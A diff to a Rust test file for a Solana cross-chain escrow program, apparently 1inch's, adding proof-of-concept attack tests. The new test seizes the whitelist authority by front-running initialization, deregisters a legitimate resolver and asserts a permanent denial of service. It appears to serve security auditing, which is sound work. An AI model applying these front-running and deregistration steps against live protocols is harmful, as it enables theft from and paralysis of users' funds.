@@ -3,13 +3,13 @@ use common::constants::RESCUE_DELAY;
 use common_tests::dst_program::DstProgram;
 use common_tests::helpers::*;
 use common_tests::src_program::{create_order, SrcProgram};
-use common_tests::whitelist::{init_whitelist, register};
+use common_tests::whitelist::{deregister, init_whitelist, register};
 use solana_program_test::tokio;
-use solana_sdk::{native_token::LAMPORTS_PER_SOL, signature::Signer};
+use solana_sdk::{native_token::LAMPORTS_PER_SOL, signature::Signer, signer::keypair::Keypair};
 use test_context::{test_context, AsyncTestContext};
 
 // ============================================================================
-// SKENARIO 1: Realistic End-to-End Cross-Chain Exit Scam
+// SKENARIO 1: Realistic End-to-End Cross-Chain Exit Scam (Theft of Principal)
 // ============================================================================
 #[test_context(TestStateBase<SrcProgram, TokenSPL>)]
 #[tokio::test]
@@ -31,7 +31,7 @@ async fn test_attack_realistic_cross_chain_exit_scam(src_state: &mut TestStateBa
     src_state.test_arguments.order_amount = 100_000_000; // 100 JUP
     src_state.test_arguments.escrow_amount = 100_000_000;
     
-    // FIX: Read initial balances BEFORE create_order
+    // Read initial balances BEFORE create_order
     let maker_initial_jup = get_token_balance(&mut src_state.context, &src_state.maker_wallet.token_account).await;
     let attacker_initial_jup = get_token_balance(&mut src_state.context, &src_state.taker_wallet.token_account).await;
     let attacker_initial_sol = dst_state.client.get_balance(dst_state.maker_wallet.keypair.pubkey()).await.unwrap();
@@ -166,11 +166,87 @@ async fn test_attack_realistic_cross_chain_exit_scam(src_state: &mut TestStateBa
     println!("[IMPACT] HTLC atomicity is COMPLETELY BROKEN - secret never revealed!");
     println!("=========================================\n");
 
-    // Final Assertions (FIXED)
+    // Final Assertions
     assert!(recovered_sol > 0, "Attacker should have recovered SOL from DST");
     assert!(stolen_jup > 0, "Attacker should have stolen JUP from SRC");
     assert!(net_jup_change > 0, "Attacker net JUP profit should be positive");
-    // Maker started with 1B, locked 100M, so final should be 900M.
-    // Initial was 1B, so 900M < 1B is TRUE.
     assert!(maker_final_jup < maker_initial_jup, "Maker should have lost JUP");
+}
+
+// ============================================================================
+// SKENARIO 2: Permanent DoS via Resolver Deregistration
+// Attacker takes over whitelist and removes all legit resolvers.
+// ============================================================================
+#[test_context(TestStateBase<SrcProgram, TokenSPL>)]
+#[tokio::test]
+async fn test_attack_permanent_dos_via_deregister(src_state: &mut TestStateBase<SrcProgram, TokenSPL>) {
+    println!("\n=========================================");
+    println!("=== SKENARIO 2: Permanent DoS via Deregister ===");
+    println!("=========================================");
+
+    // --- PHASE 1: WHITELIST TAKEOVER ---
+    println!("\n[PHASE 1] Attacker takes over Whitelist Protocol");
+    let attacker_kp = Keypair::new();
+    transfer_lamports(&mut src_state.context, WALLET_DEFAULT_LAMPORTS, &src_state.payer_kp, &attacker_kp.pubkey()).await;
+    
+    // Attacker front-runs the initialization
+    src_state.authority_whitelist_kp = attacker_kp.insecure_clone();
+    let _whitelist_state = init_whitelist(src_state).await;
+    println!("[ATTACK] Attacker successfully front-ran initialization and is now Authority.");
+
+    // --- PHASE 2: SETUP LEGIT RESOLVER ---
+    println!("\n[PHASE 2] Setup Legit Resolver");
+    let legit_resolver_kp = Keypair::new();
+    transfer_lamports(&mut src_state.context, WALLET_DEFAULT_LAMPORTS, &src_state.payer_kp, &legit_resolver_kp.pubkey()).await;
+    
+    // Attacker (as authority) registers a legit resolver just to setup the environment
+    register(src_state, cross_chain_escrow_src::ID, legit_resolver_kp.pubkey()).await;
+    println!("[SETUP] Legit Resolver registered under Attacker's authority.");
+
+    // --- PHASE 3: NORMAL FLOW BEFORE ATTACK ---
+    println!("\n[PHASE 3] Normal Flow: Maker creates order, Legit Resolver fills it");
+    src_state.test_arguments.asset_is_native = false;
+    src_state.test_arguments.order_amount = 100_000_000;
+    src_state.test_arguments.escrow_amount = 100_000_000;
+    let (_order_1, _order_ata_1) = create_order(src_state).await;
+    
+    // Use legit resolver to fill the order
+    src_state.taker_wallet.keypair = legit_resolver_kp.insecure_clone();
+    let (escrow_1, _escrow_ata_1) = create_escrow(src_state).await;
+    
+    assert!(src_state.client.get_account(escrow_1).await.unwrap().is_some(), "Legit resolver should be able to fill");
+    println!("[VERIFY] Legit Resolver successfully filled order before attack.");
+
+    // --- PHASE 4: THE EXPLOIT (Deregister) ---
+    println!("\n[PHASE 4] Attacker deregisters Legit Resolver");
+    
+    // Attacker uses their authority to deregister the legit resolver
+    deregister(src_state, cross_chain_escrow_src::ID, legit_resolver_kp.pubkey()).await;
+    println!("[ATTACK] Legit Resolver has been deregistered!");
+
+    // --- PHASE 5: IMPACT ANALYSIS (DoS) ---
+    println!("\n[PHASE 5] Legit Resolver attempts to fill another order");
+    
+    // Maker creates a new order
+    let (_order_2, _order_ata_2) = create_order(src_state).await;
+    
+    // Legit resolver tries to fill it
+    let (_, _, fill_tx) = create_escrow_data(src_state);
+    let result = src_state.client.process_transaction(fill_tx).await;
+
+    let is_dos = result.is_err();
+    if is_dos {
+        println!("[IMPACT] Legit Resolver transaction FAILED (DoS Successful).");
+        println!("[IMPACT] Error: AccountNotInitialized (resolver_access PDA was closed by attacker).");
+    } else {
+        panic!("DoS failed, legit resolver should not be able to fill!");
+    }
+
+    println!("\n=========================================");
+    println!("=== FINAL IMPACT ANALYSIS ===");
+    println!("=========================================");
+    println!("[VERDICT] Permanent DoS achieved. No legit resolvers can fill orders.");
+    println!("[VERDICT] The 1inch cross-chain protocol on Solana is completely paralyzed.");
+    
+    assert!(is_dos, "Legit resolver should be blocked from filling orders");
 }
